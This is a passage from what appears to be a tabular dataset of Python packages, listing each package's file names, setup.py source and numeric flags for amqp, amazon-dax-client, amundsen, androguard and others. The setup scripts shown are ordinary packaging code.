            sys.path.remove(dirname)

    def add_project_to_sys_path(self):
        from pkg_resources import normalize_path, add_activation_listener
        from pkg_resources import working_set, require

        self.reinitialize_command(""egg_info"")
        self.run_command(""egg_info"")
        self.reinitialize_command(""build_ext"", inplace=1)
        self.run_command(""build_ext"")

        # Check if this distribution is already on sys.path
        # and remove that version, this ensures that the right
        # copy of the package gets tested.

        self.__old_path = sys.path[:]
        self.__old_modules = sys.modules.copy()

        ei_cmd = self.get_finalized_command(""egg_info"")
        sys.path.insert(0, normalize_path(ei_cmd.egg_base))
        sys.path.insert(1, os.path.dirname(__file__))

        # Strip the namespace packages defined in this distribution
        # from sys.modules, needed to reset the search path for
        # those modules.

        nspkgs = getattr(self.distribution, ""namespace_packages"", None)
        if nspkgs is not None:
            for nm in nspkgs:
                del sys.modules[nm]

        # Reset pkg_resources state:
        add_activation_listener(lambda dist: dist.activate())
        working_set.__init__()
        require(""%s==%s"" % (ei_cmd.egg_name, ei_cmd.egg_version))

    def remove_from_sys_path(self):
        from pkg_resources import working_set

        sys.path[:] = self.__old_path
        sys.modules.clear()
        sys.modules.update(self.__old_modules)
        working_set.__init__()

    def run(self):
        import unittest

        # Ensure that build directory is on sys.path (py3k)

        self.cleanup_environment()
        self.add_project_to_sys_path()

        try:
            meta = self.distribution.metadata
            name = meta.get_name()
            test_pkg = name + ""_tests""
            suite = importExternalTestCases(unittest, ""test_*.py"", test_pkg, test_pkg)

            runner = unittest.TextTestRunner(verbosity=self.verbosity)
            result = runner.run(suite)

            # Print out summary. This is a structured format that
            # should make it easy to use this information in scripts.
            summary = {
                ""count"": result.testsRun,
                ""fails"": len(result.failures),
                ""errors"": len(result.errors),
                ""xfails"": len(getattr(result, ""expectedFailures"", [])),
                ""xpass"": len(getattr(result, ""expectedSuccesses"", [])),
                ""skip"": len(getattr(result, ""skipped"", [])),
            }
            print(""SUMMARY: %s"" % (summary,))
            if summary[""fails""] or summary[""errors""]:
                sys.exit(1)

        finally:
            self.remove_from_sys_path()


#
#
#
#  And finally run the setuptools main entry point.
#
#
#

metadata = parse_setup_cfg()

setup(cmdclass={""test"": my_test, ""egg_info"": my_egg_info}, **metadata)
",0
amazon-dax-client-2.0.1,1,1,1,0,1,0,0,0,AmazonDaxClient.py Assemblers.py AttributeValueDecoder.py AttributeValueEncoder.py Cache.py CborDecoder.py CborEncoder.py CborSExprGenerator.py CborTypes.py Cluster.py ClusterUtil.py compat.py Constants.py DaxCborDecoder.py DaxCborTypes.py DaxClient.py DaxError.py DocumentPath.py DynamoDbExpressionParser.py DynamoDbV1Converter.py Stubs.py __init__.py DynamoDbGrammarLexer.py DynamoDbGrammarListener.py DynamoDbGrammarParser.py Tokens.py __init__.py DynamoDbGrammarLexer.py DynamoDbGrammarListener.py DynamoDbGrammarParser.py Tokens.py __init__.py ItemBuilder.py LexDecimal.py RequestValidator.py Resource.py RetryHandler.py Router.py SigV4Gen.py Tube.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in NOTICE.txt PKG-INFO README.rst requirements-dev.txt requirements.txt setup.cfg setup.py,"#!/usr/bin/env python
#
# Copyright 2017 Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License""). You may not
# use this file except in compliance with the License. A copy of the License
# is located at
#
#    http://aws.amazon.com/apache2.0/
#
# or in the ""license"" file accompanying this file. This file is distributed on
# an ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
# express or implied. See the License for the specific language governing
# permissions and limitations under the License.

import codecs
import os.path
import re
import sys

from setuptools import setup
from setuptools.command.test import test as TestCommand

PY2 = sys.version_info[0] == 2

here = os.path.abspath(os.path.dirname(__file__))

class PyTest(TestCommand):
    user_options = [('pytest-args=', 'a', ""Arguments to pass into py.test"")]

    def __init__(self, *args, **kwargs):
        super(PyTest, self).__init__(*args, **kwargs)
        self.pytest_args = None
        self.test_suite = None

    def initialize_options(self):
        TestCommand.initialize_options(self)
        try:
            from multiprocessing import cpu_count
            self.pytest_args = ['-n', str(cpu_count()), '--boxed']
        except (ImportError, NotImplementedError):
            self.pytest_args = ['-n', '1', '--boxed']

    def finalize_options(self):
        TestCommand.finalize_options(self)
        self.test_args = []
        self.test_suite = True

    def run_tests(self):
        import pytest

        errno = pytest.main(self.pytest_args)
        sys.exit(errno)

def read(*parts):
    return codecs.open(os.path.join(here, *parts), 'r').read()

def find_version(*file_paths):
    version_file = read(*file_paths)
    version_match = re.search(r""^__version__ = ['\""]([^'\""]*)['\""]"",
                              version_file, re.M)
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")

def read_requirements(filename):
    with open(filename, encoding='utf-8') as requirements:
        return [package.strip() for package in requirements]

def read_readme():
    with open('README.rst', encoding='utf-8') as readme:
        return readme.read()

packages = [
    'amazondax',
    'amazondax.generated',
    # Both versions must be included since we don't know where it will end up running
    'amazondax.grammar',
    'amazondax.grammar2'
]


install_requires = read_requirements(""requirements.txt"")
tests_require = read_requirements('requirements-dev.txt')

setup_params = dict(
    name='amazon-dax-client',
    version=find_version(""amazondax"", ""__init__.py""),
    author='Amazon Web Services',
    packages=packages,
    url='https://aws.amazon.com/dynamodb/dax/',
    scripts=[],
    license='Apache License 2.0',
    description='Amazon DAX Client for Python',
    long_description=read_readme(),
    install_requires=install_requires,
    tests_require=tests_require,
    cmdclass={'test': PyTest},
    python_requires='>=3.6',
    classifiers=(
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
    ),
)

setup(**setup_params)
",1
amqp-5.1.1,0,1,1,0,0,0,0,0,abstract_channel.py basic_message.py channel.py connection.py exceptions.py method_framing.py platform.py protocol.py sasl.py serialization.py spec.py transport.py utils.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt Changelog changelog.rst conf.py celery_128.png favicon.ico introduction.txt index.rst make.bat Makefile amqp.abstract_channel.rst amqp.basic_message.rst amqp.channel.rst amqp.connection.rst amqp.exceptions.rst amqp.method_framing.rst amqp.platform.rst amqp.protocol.rst amqp.sasl.rst amqp.serialization.rst amqp.spec.rst amqp.transport.rst amqp.utils.rst index.rst readme.txt .keep sidebardonations.html update_comments_from_spec.py LICENSE MANIFEST.in PKG-INFO README.rst default.txt docs.txt pkgutils.txt test-ci.txt test.txt setup.cfg setup.py conftest.py test_integration.py test_rmq.py __init__.py mocks.py conftest.py test_abstract_channel.py test_basic_message.py test_channel.py test_connection.py test_exceptions.py test_method_framing.py test_platform.py test_sasl.py test_serialization.py test_transport.py test_utils.py __init__.py __init__.py,"#!/usr/bin/env python3

import re
import sys
from os import environ
from pathlib import Path

import setuptools
import setuptools.command.test

NAME = 'amqp'

# -*- Classifiers -*-

classes = """"""
    Development Status :: 5 - Production/Stable
    Programming Language :: Python
    Programming Language :: Python :: 3 :: Only
    Programming Language :: Python :: 3
    Programming Language :: Python :: 3.7
    Programming Language :: Python :: 3.8
    Programming Language :: Python :: 3.9
    Programming Language :: Python :: 3.10
    Programming Language :: Python :: Implementation :: CPython
    Programming Language :: Python :: Implementation :: PyPy
    License :: OSI Approved :: BSD License
    Intended Audience :: Developers
    Operating System :: OS Independent
""""""
classifiers = [s.strip() for s in classes.split('\n') if s]

# -*- Distribution Meta -*-

re_meta = re.compile(r'__(\w+?)__\s*=\s*(.*)')
re_doc = re.compile(r'^""""""(.+?)""""""')


def add_default(m):
    attr_name, attr_value = m.groups()
    return (attr_name, attr_value.strip(""\""'"")),


def add_doc(m):
    return ('doc', m.groups()[0]),


pats = {re_meta: add_default,
        re_doc: add_doc}
here = Path(__file__).parent
meta = {}
for line in (here / 'amqp/__init__.py').read_text().splitlines():
    if line.strip() == '# -eof meta-':
        break
    for pattern, handler in pats.items():
        m = pattern.match(line.strip())
        if m:
            meta.update(handler(m))

# -*- Installation Requires -*-

py_version = sys.version_info
is_jython = sys.platform.startswith('java')
is_pypy = hasattr(sys, 'pypy_version_info')


def strip_comments(l):
    return l.split('#', 1)[0].strip()


def reqs(f):
    lines = (here / 'requirements' / f).read_text().splitlines()
    reqs = [strip_comments(l) for l in lines]
    return list(filter(None, reqs))


# -*- %%% -*-


class pytest(setuptools.command.test.test):
    user_options = [('pytest-args=', 'a', 'Arguments to pass to py.test')]

    def initialize_options(self):
        setuptools.command.test.test.initialize_options(self)
        self.pytest_args = ''

    def run_tests(self):
        import pytest
        pytest_args = self.pytest_args.split(' ')
        sys.exit(pytest.main(pytest_args))


if environ.get(""CELERY_ENABLE_SPEEDUPS""):
    setup_requires = ['Cython']
    ext_modules = [
        setuptools.Extension(
            'amqp.serialization',
            [""amqp/serialization.py""],
        ),
        setuptools.Extension(
            'amqp.basic_message',
            [""amqp/basic_message.py""],
        ),
        setuptools.Extension(
            'amqp.method_framing',
            [""amqp/method_framing.py""],
        ),
        setuptools.Extension(
            'amqp.abstract_channel',
            [""amqp/abstract_channel.py""],
        ),
        setuptools.Extension(
            'amqp.utils',
            [""amqp/utils.py""],
        ),
    ]
else:
    setup_requires = []
    ext_modules = []

setuptools.setup(
    name=NAME,
    packages=setuptools.find_packages(exclude=['ez_setup', 't', 't.*']),
    version=meta['version'],
    description=meta['doc'],
    long_description=(here / 'README.rst').read_text(),
    long_description_content_type=""text/x-rst"",
    keywords='amqp rabbitmq cloudamqp messaging',
    author=meta['author'],
    author_email=meta['contact'],
    maintainer=meta['maintainer'],
    url=meta['homepage'],
    platforms=['any'],
    license='BSD',
    classifiers=classifiers,
    python_requires="">=3.6"",
    install_requires=reqs('default.txt'),
    setup_requires=setup_requires,
    tests_require=reqs('test.txt'),
    cmdclass={'test': pytest},
    zip_safe=False,
    ext_modules=ext_modules,
)
",0
amqplib-1.0.2,0,1,1,1,1,0,0,0,abstract_channel.py basic_message.py channel.py connection.py exceptions.py method_framing.py serialization.py transport.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGES amqp_clock.py demo_receive.py demo_send.py code_layout.txt overview.txt generate_skeleton_0_8.py README INSTALL LICENSE MANIFEST.in PKG-INFO README setup.cfg setup.py fake_redirect.py run_all.py settings.py test_basic_message.py test_channel.py test_connection.py test_exceptions.py test_serialization.py test_with.py TODO,,1
amundsen-common-0.27.1,0,1,1,1,1,0,0,0,resource_type.py __init__.py action_log.py action_log_callback.py action_log_model.py auth_caller_retrieval.py caller_retrieval.py http_header_caller_retrieval.py __init__.py health_check.py __init__.py badge.py dashboard.py feature.py generation_code.py index_map.py lineage.py popular_table.py search.py table.py tag.py user.py __init__.py py.typed fixtures.py __init__.py atlas.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md requirements-dev.txt setup.cfg setup.py,"# Copyright Contributors to the Amundsen project.
# SPDX-License-Identifier: Apache-2.0
import os

from setuptools import find_packages, setup

__version__ = '0.27.1'


requirements_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'requirements-dev.txt')
with open(requirements_path) as requirements_file:
    requirements_dev = requirements_file.readlines()


setup(
    name='amundsen-common',
    version=__version__,
    description='Common code library for Amundsen',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/amundsen-io/amundsen/tree/main/common',
    maintainer='Amundsen TSC',
    maintainer_email='amundsen-tsc@lists.lfai.foundation',
    packages=find_packages(exclude=['tests*']),
    install_requires=[
        # Packages in here should rarely be pinned. This is because these
        # packages (at the specified version) are required for project
        # consuming this library. By pinning to a specific version you are the
        # number of projects that can consume this or forcing them to
        # upgrade/downgrade any dependencies pinned here in their project.
        #
        # Generally packages listed here are pinned to a major version range.
        #
        # e.g.
        # Python FooBar package for foobaring
        # pyfoobar>=1.0, <2.0
        #
        # This will allow for any consuming projects to use this library as
        # long as they have a version of pyfoobar equal to or greater than 1.x
        # and less than 2.x installed.
        'Flask>=1.0.2',
        'attrs>=19.0.0',
        'marshmallow>=3.0',
        'marshmallow3-annotations>=1.0.0'
    ],
    extras_require={
        'all': requirements_dev
    },
    python_requires="">=3.7"",
    package_data={'amundsen_common': ['py.typed']},
)
",1
amundsen-databuilder-7.1.2,0,1,1,1,0,0,0,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt call_back.py __init__.py neptune_client.py __init__.py athena_metadata_extractor.py atlas_search_data_extractor.py base_bigquery_extractor.py base_extractor.py base_postgres_metadata_extractor.py base_teradata_metadata_extractor.py bigquery_metadata_extractor.py bigquery_usage_extractor.py bigquery_watermark_extractor.py cassandra_extractor.py csv_extractor.py apache_superset_chart_extractor.py apache_superset_extractor.py apache_superset_metadata_extractor.py apache_superset_table_extractor.py __init__.py databricks_sql_dashboard_extractor.py databricks_sql_dashboard_utils.py __init__.py mode_dashboard_charts_batch_extractor.py mode_dashboard_constants.py mode_dashboard_executions_extractor.py mode_dashboard_extractor.py mode_dashboard_last_modified_timestamp_extractor.py mode_dashboard_last_successful_executions_extractor.py mode_dashboard_owner_extractor.py mode_dashboard_queries_extractor.py mode_dashboard_usage_extractor.py mode_dashboard_user_extractor.py mode_dashboard_utils.py __init__.py redash_dashboard_extractor.py redash_dashboard_utils.py __init__.py tableau_dashboard_constants.py tableau_dashboard_extractor.py tableau_dashboard_last_modified_extractor.py tableau_dashboard_query_extractor.py tableau_dashboard_table_extractor.py tableau_dashboard_utils.py tableau_external_table_extractor.py __init__.py __init__.py db2_metadata_extractor.py dbt_extractor.py db_api_extractor.py delta_lake_metadata_extractor.py dremio_metadata_extractor.py druid_metadata_extractor.py es_base_extractor.py es_column_stats_extractor.py es_last_updated_extractor.py es_metadata_extractor.py es_watermark_extractor.py eventbridge_extractor.py feast_extractor.py generic_extractor.py generic_usage_extractor.py glue_extractor.py hive_table_last_updated_extractor.py hive_table_metadata_extractor.py kafka_source_extractor.py mssql_metadata_extractor.py mysql_metadata_extractor.py mysql_search_data_extractor.py neo4j_extractor.py neo4j_search_data_extractor.py neptune_search_data_extractor.py openlineage_extractor.py oracle_metadata_extractor.py pandas_profiling_column_stats_extractor.py postgres_metadata_extractor.py presto_view_metadata_extractor.py redshift_metadata_extractor.py rest_api_extractor.py __init__.py salesforce_extractor.py snowflake_metadata_extractor.py snowflake_table_last_updated_extractor.py sql_alchemy_extractor.py table_metadata_constants.py teradata_metadata_extractor.py bamboohr_user_extractor.py __init__.py __init__.py vertica_metadata_extractor.py __init__.py filesystem.py metadata.py __init__.py base_job.py job.py __init__.py base_loader.py file_system_atlas_csv_loader.py file_system_csv_loader.py file_system_elasticsearch_json_loader.py file_system_mysql_csv_loader.py file_system_neo4j_csv_loader.py file_system_neptune_csv_loader.py generic_loader.py __init__.py application.py atlas_entity.py atlas_relationship.py atlas_serializable.py badge.py cluster_constants.py __init__.py dashboard_chart.py dashboard_execution.py dashboard_last_modified.py dashboard_metadata.py dashboard_owner.py dashboard_query.py dashboard_table.py dashboard_usage.py __init__.py dashboard_elasticsearch_document.py description_metadata.py elasticsearch_document.py es_last_updated.py feature_elasticsearch_document.py feature_generation_code.py feature_metadata.py feature_watermark.py __init__.py graph_node.py graph_relationship.py graph_serializable.py owner.py owner_constants.py base.py query.py query_execution.py query_join.py query_where.py __init__.py report.py schema.py schema_constant.py __init__.py table_column_usage.py table_elasticsearch_document.py table_last_updated.py table_lineage.py table_metadata.py table_owner.py table_serializable.py table_source.py table_stats.py timestamp_constants.py __init__.py type_metadata.py usage.py usage_constants.py __init__.py user.py user_elasticsearch_document.py watermark.py __init__.py atlas_csv_publisher.py base_publisher.py elasticsearch_constants.py elasticsearch_publisher.py mysql_csv_publisher.py neo4j_csv_publisher.py neo4j_preprocessor.py neptune_csv_publisher.py __init__.py base_rest_api_query.py mode_paginated_rest_api_query.py __init__.py query_merger.py rest_api_failure_handlers.py rest_api_query.py __init__.py atlas_serializer.py mysql_serializer.py neo4_serializer.py neptune_serializer.py __init__.py base_task.py mysql_staleness_removal_task.py neo4j_staleness_removal_task.py neptune_staleness_removal_task.py document_mappings.py search_data_queries.py search_metadata_to_elasticsearch_task.py __init__.py task.py __init__.py base_transformer.py bigquery_usage_transformer.py complex_type_transformer.py dict_to_model.py generic_transformer.py regex_str_replace_transformer.py remove_field_transformer.py table_tag_transformer.py template_variable_substitution_transformer.py timestamp_string_to_epoch.py __init__.py 00_cluster_schema.json 01_1_reader.json 01_2_table_schema.json 01_3_bookmark.json 01_4_report.json 01_column_schema.json 01_column_table_relation.json 01_database_cluster_relation.json 01_database_schema.json 01_schema_cluster_relation.json 01_schema_schema.json 01_source_schema.json 01_table_schema_relation.json 01_table_source_relation.json 02_user.json 04_reader_referenceable_relation.json 04_user_reader_relation.json 05_1_hive_table_partition.json 05_table_partition_schema.json 06_user_table_owner_relation.json 07_application_schema.json 08_lineage_schema.json 01_group.json 02_dashboard.json 03_query.json 04_chart.json 05_execution.json 06_dashboard_cluster_relation.json __init__.py __init__.py types_def.py __init__.py __init__.py atlas.py closer.py hive_complex_type_parser.py trino_complex_type_parser.py __init__.py __init__.py __init__.py MANIFEST.in PKG-INFO README.md requirements-dev.txt requirements.txt setup.cfg setup.py,"# Copyright Contributors to the Amundsen project.
# SPDX-License-Identifier: Apache-2.0

import os

from setuptools import find_packages, setup

__version__ = '7.1.2'

requirements_path = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                 'requirements.txt')
with open(requirements_path, 'r') as requirements_file:
    requirements = requirements_file.readlines()

requirements_path = os.path.join(os.path.dirname(os.path.realpath(__file__)),
                                 'requirements-dev.txt')
with open(requirements_path, 'r') as requirements_file:
    requirements_dev = requirements_file.readlines()

kafka = ['confluent-kafka==1.0.0']

cassandra = ['cassandra-driver==3.20.1']

glue = ['boto3==1.17.23']

snowflake = [
    'snowflake-connector-python',
    'snowflake-sqlalchemy'
]

athena = ['PyAthena[SQLAlchemy]>=1.0.0, <2.0.0']

# Python API client for google
# License: Apache Software License
# Upstream url: https://github.com/googleapis/google-api-python-client
bigquery = [
    'google-api-python-client>=1.6.0, <2.0.0dev',
    'google-auth-httplib2>=0.0.1',
    'google-auth>=1.16.0, <3.0.0dev'
]

jsonpath = ['jsonpath_rw==1.4.0']

db2 = [
    'ibm_db>=3.0.1',
    'ibm-db-sa-py3>=0.3.1-1'
]

dremio = [
    'pyodbc==4.0.30'
]

druid = [
    'pydruid'
]

spark = [
    'pyspark == 3.0.1'
]

neptune = [
    'amundsen-gremlin>=0.0.9',
    'Flask==1.0.2',
    'gremlinpython==3.4.3',
    'requests-aws4auth==1.1.0',
    'typing-extensions==4.0.0',
    'overrides==2.5',
    'boto3==1.17.23'
]

feast = [
    'feast==0.17.0',
    'fastapi!=0.76.*'
]

atlas = [
    'pyatlasclient>=1.1.2',
    'apache-atlas>=0.0.11'
]

oracle = [
    'cx_Oracle==8.2.1'
]

rds = [
    'sqlalchemy>=1.3.6,<1.4',
    'mysqlclient>=1.3.6,<3'
]

salesforce = [
    'simple-salesforce>=1.11.2'
]

teradata = [
    'teradatasqlalchemy==17.0.0.0'
]

all_deps = requirements + requirements_dev + kafka + cassandra + glue + snowflake + athena + \
    bigquery + jsonpath + db2 + dremio + druid + spark + feast + neptune + rds \
    + atlas + salesforce + oracle + teradata

setup(
    name='amundsen-databuilder',
    version=__version__,
    description='Amundsen Data builder',
    url='https://www.github.com/amundsen-io/amundsen/tree/main/databuilder',
    maintainer='Amundsen TSC',
    maintainer_email='amundsen-tsc@lists.lfai.foundation',
    packages=find_packages(exclude=['tests*']),
    include_package_data=True,
    dependency_links=[],
    install_requires=requirements,
    python_requires='>=3.7',
    extras_require={
        'all': all_deps,
        'dev': requirements_dev,
        'kafka': kafka,  # To use with Kafka source extractor
        'cassandra': cassandra,
        'glue': glue,
        'snowflake': snowflake,
        'athena': athena,
        'bigquery': bigquery,
        'jsonpath': jsonpath,
        'db2': db2,
        'dremio': dremio,
        'druid': druid,
        'neptune': neptune,
        'delta': spark,
        'feast': feast,
        'atlas': atlas,
        'rds': rds,
        'salesforce': salesforce,
        'oracle': oracle,
        'teradata': teradata,
    },
    classifiers=[
        'Programming Language :: Python :: 3.7',
    ],
)
",1
amundsen-rds-0.0.6,0,1,1,1,0,0,0,0,alembic.ini env.py a539c998cc1e_add_profile_url_column_to_users_table.py c194a2dc1240_initial_commit.py __init__.py __init__.py application.py badge.py base.py cluster.py column.py dashboard.py database.py schema.py table.py tag.py updated_timestamp.py user.py __init__.py py.typed __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md requirements.txt setup.cfg setup.py,"# Copyright Contributors to the Amundsen project.
# SPDX-License-Identifier: Apache-2.0

from setuptools import find_packages, setup

__version__ = '0.0.6'


requirements = [
    'sqlalchemy>=1.3.0,<1.4',
    'alembic>=1.2,<2.0'
]

setup(
    name='amundsen-rds',
    version=__version__,
    description='Amundsen ORM Support',
    url='https://www.github.com/amundsen-io/amundsenrds',
    maintainer='Amundsen TSC',
    maintainer_email='amundsen-tsc@lists.lfai.foundation',
    packages=find_packages(),
    dependency_links=[],
    install_requires=requirements,
    python_requires='>=3.6',
    extras_require={},
    classifiers=[
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
    ],
    package_data={
        'amundsen_rds': ['py.typed', '*.ini']
    }
)
",0
analytics-python-1.4.0,0,1,1,1,1,0,0,0,client.py consumer.py request.py client.py consumer.py module.py request.py utils.py __init__.py utils.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"import os
import sys

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

# Don't import analytics-python module here, since deps may not be installed
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'analytics'))
from version import VERSION

long_description = '''
Segment is the simplest way to integrate analytics into your application.
One API allows you to turn on any other analytics service. No more learning
new APIs, repeated code, and wasted development time.

This is the official python client that wraps the Segment REST API (https://segment.com).

Documentation and more details at https://github.com/segmentio/analytics-python
'''

install_requires = [
    ""requests>=2.7,<3.0"",
    ""six>=1.5"",
    ""monotonic>=1.5"",
    ""backoff==1.10.0"",
    ""python-dateutil>2.1""
]

tests_require = [
    ""mock==2.0.0"",
    ""pylint==1.9.3"",
    ""flake8==3.7.9"",
]

setup(
    name='analytics-python',
    version=VERSION,
    url='https://github.com/segmentio/analytics-python',
    author='Segment',
    author_email='friends@segment.com',
    maintainer='Segment',
    maintainer_email='friends@segment.com',
    test_suite='analytics.test.all',
    packages=['analytics', 'analytics.test'],
    license='MIT License',
    install_requires=install_requires,
    extras_require={
        'test': tests_require
    },
    description='The hassle-free way to integrate analytics into any python application.',
    long_description=long_description,
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.2"",
        ""Programming Language :: Python :: 3.3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",1
androguard-3.3.5,0,1,1,0,1,0,1,0,androarsc.py androaxml.py androcg.py androdd.py androdis.py entry_points.py main.py __init__.py analysis.py auto.py tags.py __init__.py androconf.py permissions_10.json permissions_13.json permissions_14.json permissions_15.json permissions_16.json permissions_17.json permissions_18.json permissions_19.json permissions_21.json permissions_22.json permissions_23.json permissions_24.json permissions_25.json permissions_26.json permissions_27.json permissions_28.json permissions_4.json permissions_5.json permissions_6.json permissions_7.json permissions_8.json permissions_9.json permissions_16.json permissions_17.json permissions_18.json permissions_19.json permissions_21.json permissions_22.json permissions_23.json permissions_24.json permissions_25.json __init__.py bytecode.py apk.py types.py __init__.py dvm.py dvm_types.py mutf8.py __init__.py public.py public.xml __init__.py __init__.py basic_blocks.py control_flow.py dast.py dataflow.py decompile.py graph.py instruction.py node.py opcode_ins.py util.py writer.py __init__.py decompiler.py __init__.py androguard.ico annotation.ui apiwindow.py Banners.py BinViewMode.py binwindow.py cemu.py DataModel.py DisasmViewMode.py fileloading.py helpers.py HexViewMode.py mainwindow.py methodswindow.py renamewindow.py resourceswindow.py search.ui SourceViewMode.py sourcewindow.py stringswindow.py TextDecorators.py TextSelection.py treewindow.py ViewMode.py xrefwindow.py __init__.py misc.py session.py util.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt androgui.py androlyze.py androsign.py PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python
from __future__ import print_function
import sys
from androguard import __version__

from setuptools import setup, find_packages


# We do not support python versions <2.7 and python <3.4
if (sys.version_info.major == 3 and sys.version_info.minor < 4) or (sys.version_info.major == 2 and sys.version_info.minor < 7):
    print(""Unfortunatly, your python version is not supported!\n""
          ""Please upgrade at least to python 2.7 or 3.4!"", file=sys.stderr)
    sys.exit(1)

# PyQT5 is only available for python >=3.5
if sys.version_info <= (3, 4):
    print(""PyQT5 is probably not available for your system, the GUI might not work!"", file=sys.stderr)

install_requires = ['future',
                    'networkx>=1.11',
                    'pygments',
                    'lxml',
                    'colorama',
                    'matplotlib',
                    'asn1crypto>=0.24.0',
                    'click',
                    'pydot>=1.4.1',
                    ]

# python version specific library versions:
#
# IPython Issue: For python2.x, a version <6 is required
if sys.version_info >= (3, 3):
    install_requires.append('ipython>=5.0.0')
else:
    install_requires.append('ipython>=5.0.0,<6')


# TODO add the permission mapping generation at a better place!
# from axplorer_to_androguard import generate_mappings
# generate_mappings()

setup(
    name='androguard',
    description='Androguard is a full python tool to play with Android files.',
    long_description=""""""Androguard is a tool and python library to interact with Android Files.
    
    Usually they come in the form of Android Packages (APK) or Dalvik Executeable (DEX) files.
    Androguard has tools to read Android's binary format for XML files (AXML) and is also suited with a decompiler for DEX.
    
    Androguard might not only be used as a tool for reverse engineering single applications, but features a lot of functions
    for automated analysis. It provides a pure python framework to build your own analysis tools.
    
    If you encounter bugs while using androguard, please feel free to report them in our bugtracker_.
    
    .. _bugtracker: https://github.com/androguard/androguard/issues
    """""",
    version=__version__,
    license=""Apache Licence, Version 2.0"",
    url=""https://github.com/androguard/androguard"",
    download_url=""https://github.com/androguard/androguard/releases"",
    packages=find_packages(),
    package_data={
        # add the json files, residing in the api_specific_resources package
        ""androguard.core.api_specific_resources"": [""aosp_permissions/*.json"",
                                                   ""api_permission_mappings/*.json""],
        ""androguard.core.resources"": [""public.xml""],
        # Collect also the GUI files this way
        ""androguard.gui"": [""annotation.ui"", ""search.ui"", ""androguard.ico""],
    },
    scripts=['androaxml.py',
             'androarsc.py',
             'androsign.py',
             'androdis.py',
             'androlyze.py',
             'androdd.py',
             'androgui.py',
             'androcg.py',
             ],
    entry_points={
        'console_scripts': ['androguard=androguard.cli.entry_points:entry_point']
    },
    install_requires=install_requires,
    extras_require={
        'GUI': [""pyperclip"", ""PyQt5""],
        'magic': ['python-magic>=0.4.15'],
        'docs': ['sphinx', ""sphinxcontrib-programoutput>0.8"", 'sphinx_rtd_theme'],
        'tests': ['mock>=2.0', 'nose', 'codecov', 'coverage', 'nose-timer'],
    },
    setup_requires=['setuptools'],
    classifiers=[
                 'License :: OSI Approved :: Apache Software License',
                 'Programming Language :: Python',
                 'Programming Language :: Python :: 2',
                 'Programming Language :: Python :: 2.7',
                 'Programming Language :: Python :: 3.4',
                 'Programming Language :: Python :: 3.5',
                 'Programming Language :: Python :: 3.6',
                 'Programming Language :: Python :: 3.7',
                 'Programming Language :: Python :: 3.8',
                 'Topic :: Security',
                 'Topic :: Software Development',
                 'Topic :: Utilities',
                ],

)
",1
annoy-1.17.1,0,1,1,1,1,0,0,0,ann.png py.typed __init__.py __init__.pyi dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py annoylib.h annoymodule.cc kissrandom.h mman.h,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2013 Spotify AB
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may not
# use this file except in compliance with the License. You may obtain a copy of
# the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations under
# the License.

from setuptools import setup, Extension
import codecs
import os
import platform
import sys

readme_note = """"""\
.. note::

   For the latest source, discussion, etc, please visit the
   `GitHub repository <https://github.com/spotify/annoy>`_\n\n

.. image:: https://img.shields.io/github/stars/spotify/annoy.svg
    :target: https://github.com/spotify/annoy

""""""

with codecs.open('README.rst', encoding='utf-8') as fobj:
    long_description = readme_note + fobj.read()

# Various platform-dependent extras
extra_compile_args = ['-D_CRT_SECURE_NO_WARNINGS', '-fpermissive']
extra_link_args = []

# Not all CPUs have march as a tuning parameter
cputune = ['-march=native',]
if platform.machine() == 'ppc64le':
    extra_compile_args += ['-mcpu=native',]

if platform.machine() == 'x86_64':
    extra_compile_args += cputune

if os.name != 'nt':
    extra_compile_args += ['-O3', '-ffast-math', '-fno-associative-math']

# Add multithreaded build flag for all platforms using Python 3 and
# for non-Windows Python 2 platforms
python_major_version = sys.version_info[0]
if python_major_version == 3 or (python_major_version == 2 and os.name != 'nt'):
